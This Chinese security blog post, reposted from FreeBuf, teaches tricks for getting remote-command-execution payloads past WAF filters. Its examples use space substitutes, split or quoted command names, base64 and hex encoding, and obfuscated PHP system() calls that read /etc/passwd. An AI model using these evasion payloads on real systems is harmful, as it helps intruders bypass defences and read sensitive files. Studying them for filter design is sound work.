#  RCE bypass的一些小技巧##   
原创 几两  StepSnail   2024-01-13 21:58  
  
免责声明：  
本文仅用于安全研究和教育目的。文章中的信息仅供参考,不应被用于非法用途。由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
# RCE bypass的一些小技巧  
## 0x01 前言  
  
关于Bypass，我们应该从哪些角度开展呢。要知道怎么绕过，我们就得知道防火墙的过滤规则才行。那我们想想，比如在利用RCE漏洞的时候，我们当然想用cat、chmod、whoami、ifconfig、ls等这些操作对不对！像这些敏感命令，防火墙就会进行过滤。还有特殊字符如单引、双引、空格等等，防火墙同样会进行过滤。那我们现在知道那该死的防火墙不让我们输入那些敏感字符了，我们就要想办法找一些可以代替这些敏感字符且又能表达其字符的意思的东西对吧？  
## 0x02 RCE bypass姿势  
### 2.1 空格绕过  
  
过滤空格的情况可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过。  
```
cat<>11.php //重定向符
cat${IFS}11.php //IFS
cat$IFS$911.php //$IFS$9
{cat,11.php} //{,}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxoEibjdXZpQMUfibekjKrOquLX0ZfbuMZrl28EVPQPrmicS83FuVlIk8kicw/640?wx_fmt=png&from=appmsg "")  
### 2.2 命令或特殊字符绕过  
  
（1）、如果过滤了某个命令，可以利用命令拼接、插入空字符串或者反单引号来绕过。  
```
//假设过滤了cat
a=c;b=a;c=t;$a$b$c //拼接
c"a"t //插入空字符串
c""a""t //也是插入空字符串
c''a''t //反单引号

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxom8JMib5RccBFSg57ICxsmPFia65cTe40nicWiazr7icuFLz29HBT3AjFXZA/640?wx_fmt=png&from=appmsg "")  
  
这个也有很多灵活的变种，比如第一种拼接方法，如果过滤了分号，可以利用%0a及类似的字符来代替分号。  
  
（2）、利用base编码绕过  
  
base64编码内容是cat 11.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxot6fV3HFo0RMicibHHvRZaf0cmXeUIlupwLQE9N9NJjcRCuBwEFbrb6Vw/640?wx_fmt=png&from=appmsg "")  
  
（3）、利用hex编码（十六进制）绕过  
  
echo的十六进制是cat 11.php **注意：不加0x**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxoTqVGnictkakskMk6wE0CNO0nibm4DEBrCZicPTxwQz1vAkjUrtPvjgziag/640?wx_fmt=png&from=appmsg "")  
  
（4）、利用未初始化变量  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxooyFDOQIB7dCibYcaJt17TiacFB9EBLXGCRPmqAOKibsqabt7TjDqX9yEA/640?wx_fmt=png&from=appmsg "")  
### 2.3 过滤文件名绕过  
  
（1）、利用正则匹配绕过  
  
例如过滤了/etc/passwd文件，使用正则匹配绕过。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxoG5SkFm5q2iaYwXlzic2DZHE3vpXvvyZFjSLejRUeI5LmmnXZ2bdCGg1w/640?wx_fmt=png&from=appmsg "")  
  
（2）、使用未初始化变量绕过过滤文件名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxozj9XMj2ibRj4p5Uwhjf6LtsI1ArP4CzH7RbW3cpX01Yic6lQf9wBA9RA/640?wx_fmt=png&from=appmsg "")  
### 2.4 命令执行函数system()绕过  
  
系统命令函数system()、 passthru() 、exec() 、shell_exec()、 popen()、 proc_open()、 pcntl_exec() 、shell_exec()用以上函数都可进行绕过。  
  
（1）、函数过滤绕过  
  
"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxoHNYBv7VDiasD2wTScia4zGRdYFhMT7akS6PyUt4sZx8MokKYqgYWaoicA/640?wx_fmt=png&from=appmsg "")  
  
(sy.(st).em)(whoami);  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxo7kJ3S3RKGuPgeHicPnicgVIgPqokgOu7SfpjekHSacpUYsr4uX2wZAZg/640?wx_fmt=png&from=appmsg "")  
  
（2）、插入注释（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）  
```
php -r "system/*caixukun*/(whoami);"
php -r "system/*caixukun*/(wh./*caixukun*/(oa)/*caixukun*/.mi);"
php -r "(sy./*caixukun*/(st)/*caixukun*/.em)/*caixukun*/(wh./*caixukun*/(oa)/*caixukun*/.mi);"

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdoS2IiamawQzdgh2ywWSWxoytQdt5gBIG4lvmP7Z5XGucWo9Gjg03jJQNicPic4hM66SyzndziaFteSA/640?wx_fmt=png&from=appmsg "")  
  
  
【转载】https://www.freebuf.com/articles/web/330833.html  
  
  
  
  
  
  
  
**欢迎关注、点赞、转发**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/vs6VLQUL3HdM0flqK1zQXclTvasdAGZeMVDfgV8xrctSDJS3e3SvDBqA8VVfObCuOHbHwvDcfMjOlaScBwwBhw/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vs6VLQUL3HdM0flqK1zQXclTvasdAGZeYUdJrlh8piar4skZB2ER5zVUIBdlbSHjEOd96XYWl9AvwTVkHricx01g/640?wx_fmt=png "")  
  
  
转载声明：本文的最终解释权归原作者所有。欢迎转载本文,但请注明原作者和出处且必须保证文章的完整性,即包含原文中的所有内容。本文内容仅代表原作者个人观点和研究成果,与任何组织无关。原作者已尽量确保文章内容的准确性,但不保证文章没有疏漏或错误。未征得作者同意,不可擅自删改本文内容,也不可用于任何商业用途。望尊重作者的知识产权,按照规定和要求使用本文。如有疑问,欢迎与作者联系。  
  
  
  
  
  
  
  
  
  
